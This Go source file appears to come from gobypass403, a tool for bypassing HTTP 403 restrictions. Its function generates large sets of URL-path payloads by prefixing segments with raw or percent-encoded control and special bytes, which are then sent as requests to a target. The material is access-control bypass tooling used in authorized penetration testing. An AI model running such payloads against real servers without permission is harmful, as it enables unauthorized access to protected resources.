package payload

import (
	"fmt"
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

/*
GeneratePathPrefixPayloads generates payloads by prefixing path segments with specific
byte patterns, focusing on ASCII control characters, special characters, and 'x'.

It iterates through bytes 0-255 (`b1`) and filters for those matching the criteria.
For each relevant `b1`, it generates:

1.  **Dummy Segment Prefix (Single Byte):**
  - Adds `b1` as a new first segment.
  - Variations: Raw byte (if safe), Percent-encoded (`%XX`).
  - Example: `/admin/login` -> `/[b1]/admin/login` or `/%XX/admin/login`.

2.  **Existing Segment Prefix (Single Byte):**
  - Prepends `b1` to each *existing* segment individually.
  - Variations: Raw byte (if safe), Percent-encoded (`%XX`).
  - Example: `/admin/login` -> `/[b1]admin/login`, `/%XXadmin/login`, `/admin/[b1]login`, `/admin/%XXlogin`.

It then iterates through a second byte `b2` (0-255), also filtered for relevance.
For each relevant pair (`b1`, `b2`), it generates:

3.  **Existing Segment Prefix (Two Bytes):**
  - Prepends the byte pair (`b1b2`) to each *existing* segment individually.
  - Variations:
  - Raw bytes (`b1b2`) if *both* are safe for raw inclusion.
  - Double Percent-encoded (`%XX%YY`).
  - Example: `/admin/login` -> `/[b1b2]admin/login`, `/%XX%YYadmin/login`, `/admin/[b1b2]login`, `/admin/%XX%YYlogin`.

Helper functions `buildPath` and `addPathVariants` handle path reconstruction (preserving
original slashes) and ensure that if introduced prefixes contain literal '?' or '#',
additional payloads are generated with these characters encoded (%3F, %23) to maintain
query string validity. The original query string is appended to all generated paths.
*/
func (pg *PayloadGenerator) GeneratePathPrefixPayloads(targetURL string, bypassModule string) []BypassPayload {
	var jobs []BypassPayload
	uniquePaths := make(map[string]struct{}) // Use map to ensure unique RawURIs

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL '%s': %v", targetURL, err)
		return jobs
	}

	originalPath := parsedURL.Path
	// Treat empty path as root for consistency in segment handling?
	// Let's preserve empty path as empty unless explicitly root "/"
	isEmptyPath := originalPath == ""

	// Extract query string if it exists
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Determine path structure
	hasLeadingSlash := strings.HasPrefix(originalPath, "/") || originalPath == "/"
	hasTrailingSlash := strings.HasSuffix(originalPath, "/") && originalPath != "/"

	// Get segments
	trimmedPath := strings.Trim(originalPath, "/")
	var originalSegments []string
	if !isEmptyPath && trimmedPath == "" && originalPath == "/" {
		originalSegments = []string{""} // Root case: treat as having one empty segment for prefixing logic
	} else if !isEmptyPath && trimmedPath != "" {
		originalSegments = strings.Split(trimmedPath, "/")
	} else { // Empty path "" has no segments
		originalSegments = []string{}
	}

	// Helper function to add path variants to the map
	addPathVariants := func(pathPart string) {
		uniquePaths[pathPart+query] = struct{}{} // Add standard
		if strings.ContainsAny(pathPart, "?#") {
			encodedPathPart := encodeQueryAndFragmentChars(pathPart)
			if encodedPathPart != pathPart {
				uniquePaths[encodedPathPart+query] = struct{}{} // Add encoded variant
			}
		}
	}

	// --- Byte Iteration Loop (Filtered: ASCII Control, ASCII Special, 'x') ---
	for i := 0; i < 256; i++ {
		b1 := byte(i)

		// Filter: Only include ASCII control chars, ASCII special chars, or 'x'
		isRelevantByte1 := isControlByteASCII(b1) || isSpecialCharASCII(b1) || b1 == 'x'
		if !isRelevantByte1 {
			continue
		}

		// Only use non-problematic raw bytes directly in paths
		rawB1Str := ""
		if b1 != '?' && b1 != '#' && b1 != '\n' && b1 != '\r' && b1 != 0x20 && b1 != '.' { // Avoid chars that break URI structure raw
			rawB1Str = string([]byte{b1})
		}
		encodedB1Str := fmt.Sprintf("%%%02X", b1)

		// == Variation: Dummy Segment Prefix (Single Byte Only - Raw/Encoded) ==
		// This adds a new segment at the beginning.
		prefixesToTry := []string{}
		if rawB1Str != "" {
			prefixesToTry = append(prefixesToTry, rawB1Str)
		}
		prefixesToTry = append(prefixesToTry, encodedB1Str)

		for _, prefix := range prefixesToTry {
			// Handle empty original path correctly - prefix becomes the path
			if isEmptyPath {
				addPathVariants("/" + prefix) // Assume dummy segment makes it non-empty, add leading slash
				continue
			}

			dummySegments := make([]string, 0, len(originalSegments)+1)
			dummySegments = append(dummySegments, prefix)
			dummySegments = append(dummySegments, originalSegments...)
			pathPart := buildPath(dummySegments, hasLeadingSlash, hasTrailingSlash)
			addPathVariants(pathPart)
		}

		// == Segment-based Variations (Prefix Only - Single Byte - Raw/Encoded) ==
		// Modify existing segments, only if they exist
		if len(originalSegments) > 0 && !(len(originalSegments) == 1 && originalSegments[0] == "") { // Check > 0 segments and not just the root placeholder ""
			for j := range originalSegments {
				// Only Prefix variations are kept
				variations := []struct {
					prefix string
				}{
					{rawB1Str},
					{encodedB1Str},
				}

				for _, v := range variations {
					if v.prefix == "" {
						continue
					} // Skip if raw prefix was invalid

					modSegs := make([]string, len(originalSegments))
					copy(modSegs, originalSegments)
					// Ensure original segment is not empty before prefixing?
					// If original segment is "", like from "/a//b", prefixing gives "/a/PREFIX/b"
					// This seems acceptable.
					modSegs[j] = v.prefix + originalSegments[j] // Apply prefix
					pathPart := buildPath(modSegs, hasLeadingSlash, hasTrailingSlash)
					addPathVariants(pathPart)
				}
			}
		}

		// == Variation: Two-Byte Prefix for Existing Segments (ASCII Control/Special/'x') (Raw+Raw, Enc+Enc) ==
		// Modify existing segments, only if they exist
		if len(originalSegments) > 0 && !(len(originalSegments) == 1 && originalSegments[0] == "") {
			for k := 0; k < 256; k++ {
				b2 := byte(k)
				// Filter: Second byte must also be relevant
				isRelevantByte2 := isControlByteASCII(b2) || isSpecialCharASCII(b2) || b2 == 'x'
				if !isRelevantByte2 {
					continue
				}

				// Generate 2 encoding variations for the two bytes
				// Only create raw+raw if *both* bytes are individually safe for raw inclusion
				rawCombo := ""
				if rawB1Str != "" && b2 != '?' && b2 != '#' && b2 != '\n' && b2 != '\r' && b2 != 0x20 {
					rawCombo = string([]byte{b1, b2})
				}
				encodedCombo := fmt.Sprintf("%%%02X%%%02X", b1, b2)

				encodingsToTry := []string{}
				if rawCombo != "" {
					encodingsToTry = append(encodingsToTry, rawCombo)
				}
				encodingsToTry = append(encodingsToTry, encodedCombo)

				// Apply variations ONLY to existing segments
				for _, combo := range encodingsToTry {
					// Existing Segment Prefix: /HEREHEREadmin/login, /admin/HEREHERElogin etc.
					for j := range originalSegments {
						modSegsPfx := make([]string, len(originalSegments))
						copy(modSegsPfx, originalSegments)
						modSegsPfx[j] = combo + originalSegments[j]
						pathPart := buildPath(modSegsPfx, hasLeadingSlash, hasTrailingSlash)
						addPathVariants(pathPart)
					}
				}
			}
		}
	} // End main loop (i=0 to 255)

	// Convert unique paths map to BypassPayload slice
	finalJobs := make([]BypassPayload, 0, len(uniquePaths))
	for rawURI := range uniquePaths {
		// Basic validation: ensure RawURI is not empty or just the query string
		if rawURI == "" || (query != "" && rawURI == query) {
			continue
		}

		job := BypassPayload{
			OriginalURL:  targetURL,
			Method:       "GET", // Defaulting to GET
			Scheme:       parsedURL.Scheme,
			Host:         parsedURL.Host,
			RawURI:       rawURI,
			BypassModule: bypassModule,
		}
		job.PayloadToken = GeneratePayloadToken(job)
		finalJobs = append(finalJobs, job)
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s", len(finalJobs), targetURL)
	return finalJobs
}

// buildPath reconstructs the path from segments, respecting original leading/trailing slashes.
func buildPath(segments []string, leadingSlash, trailingSlash bool) string {
	// Handle empty segments slice correctly
	if len(segments) == 0 {
		if leadingSlash {
			return "/"
		}
		return ""
	}

	path := strings.Join(segments, "/")

	// Handle cases where original was "/" or segments were modified
	if path == "" && leadingSlash && len(segments) == 1 && segments[0] == "" {
		return "/"
	}
	// Ensure leading slash if required, unless path itself is now empty (e.g., segment was just "/")
	if leadingSlash && !strings.HasPrefix(path, "/") && path != "" {
		path = "/" + path
	}
	// Handle case where path becomes empty after join but leading slash was expected
	if leadingSlash && path == "" && len(segments) >= 1 {
		path = "/"
	}

	if !leadingSlash && path == "" && len(segments) == 1 && segments[0] == "" {
		return "" // Original was ""
	}

	// Don't add trailing slash if it's just the root "/"
	if trailingSlash && path != "/" && !strings.HasSuffix(path, "/") {
		path = path + "/"
	}
	return path
}
